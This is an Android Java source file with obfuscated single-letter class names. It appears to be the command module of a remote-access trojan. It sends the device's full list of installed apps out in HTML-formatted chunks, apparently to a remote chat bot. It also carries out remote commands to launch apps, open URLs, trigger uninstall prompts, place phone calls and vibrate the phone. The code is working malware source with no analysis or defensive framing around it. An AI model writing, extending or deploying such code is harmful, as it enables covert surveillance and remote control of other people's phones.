// language: Java, file: s.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.VibrationEffect;
import android.os.Vibrator;

import java.util.ArrayList;
import java.util.List;

public class s {

    public static void list() {
        Thread t = new Thread(s::listSync, "v2-apps");
        t.setDaemon(true);
        t.start();
    }

    static void listSync() {
        Context c = d.ctx;
        if (c == null) return;
        try {
            PackageManager pm = c.getPackageManager();
            List<PackageInfo> all = pm.getInstalledPackages(0);
            List<String> user = new ArrayList<>();
            List<String> sys = new ArrayList<>();
            for (PackageInfo pi : all) {
                boolean system = (pi.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                String label;
                try {
                    label = pm.getApplicationLabel(pi.applicationInfo).toString();
                } catch (Throwable t) { label = pi.packageName; }
                String line = "<code>" + d.esc(pi.packageName) + "</code>\n"
                    + "   <i>" + d.esc(label) + "</i>";
                if (system) sys.add(line); else user.add(line);
            }
            user.sort(String::compareToIgnoreCase);
            sys.sort(String::compareToIgnoreCase);

            StringBuilder b = new StringBuilder();
            b.append("<b>Apps</b> — user ").append(user.size())
             .append(" · system ").append(sys.size()).append("\n\n");

            b.append("<b>User</b>\n");
            for (String l : user) {
                b.append(l).append("\n");
                if (b.length() > 3500) { d.send(b.toString()); b.setLength(0); }
            }
            b.append("\n<b>System</b>\n");
            for (String l : sys) {
                b.append(l).append("\n");
                if (b.length() > 3500) { d.send(b.toString()); b.setLength(0); }
            }
            if (b.length() > 0) d.send(b.toString());
        } catch (Throwable t) {
            e.err(t.getMessage());
        }
    }

    public static void open(String pkg) {
        if (pkg == null || pkg.isEmpty()) { e.err("usage: /app PKG"); return; }
        Context c = d.ctx;
        if (c == null) return;
        try {
            Intent i = c.getPackageManager().getLaunchIntentForPackage(pkg);
            if (i == null) { d.send("<i>no launchable activity: "
                + d.esc(pkg) + "</i>"); return; }
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Throwable t) {
            e.err(t.getMessage());
        }
    }

    public static void openUrl(String url) {
        if (url == null || url.isEmpty()) { e.err("usage: /open URL"); return; }
        Context c = d.ctx;
        if (c == null) return;
        try {
            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Throwable t) {
            e.err(t.getMessage());
        }
    }

    public static void uninstall(String pkg) {
        if (pkg == null || pkg.isEmpty()) { e.err("usage: /uninstall PKG"); return; }
        Context c = d.ctx;
        if (c == null) return;
        try {
            Intent i = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + pkg));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Throwable t) {
            e.err(t.getMessage());
        }
    }

    public static void call(String number) {
        if (number == null || number.isEmpty()) {
            e.err("usage: /call NUM");
            return;
        }
        Context c = d.ctx;
        if (c == null) return;
        Intent i = new Intent();
        i.setData(Uri.parse("tel:" + number));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        boolean haveCall = c.checkSelfPermission(android.Manifest.permission.CALL_PHONE)
            == PackageManager.PERMISSION_GRANTED;
        if (haveCall) {
            i.setAction(Intent.ACTION_CALL);
            try {
                c.startActivity(i);
                d.send("<i>calling</i> <code>"
                    + d.esc(number) + "</code>");
                return;
            } catch (Throwable t) {
                d.send("<i>call err:</i> " + d.esc(t.getMessage())
                    + "\n<i>fallback to dialer</i>");
            }
        } else {
            d.send("<i>CALL_PHONE not granted — using dialer</i>");
        }
        try {
            i.setAction(Intent.ACTION_DIAL);
            c.startActivity(i);
        } catch (Throwable t) {
            e.err(t.getMessage());
        }
    }

    public static void vibrate(int seconds) {
        if (seconds <= 0) seconds = 1;
        if (seconds > 30) seconds = 30;
        Context c = d.ctx;
        if (c == null) return;
        try {
            Vibrator v = (Vibrator) c.getSystemService(Context.VIBRATOR_SERVICE);
            if (v == null || !v.hasVibrator()) {
                d.send("<i>no vibrator</i>");
                return;
            }
            if (android.os.Build.VERSION.SDK_INT >= 26) {
                v.vibrate(VibrationEffect.createOneShot(seconds * 1000L,
                    VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                v.vibrate(seconds * 1000L);
            }
        } catch (Throwable t) {
            e.err(t.getMessage());
        }
    }
}